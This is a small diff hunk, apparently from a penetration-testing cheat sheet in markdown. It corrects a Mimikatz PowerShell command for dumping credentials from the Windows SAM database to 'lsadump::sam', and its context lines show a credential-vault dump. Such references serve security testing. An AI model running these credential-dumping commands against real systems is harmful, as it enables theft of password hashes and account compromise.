@@ -178,7 +178,7 @@ Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
 Get credentials from SAM
 ```powershell
-Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
 Dump creds and certs
 ```powershell
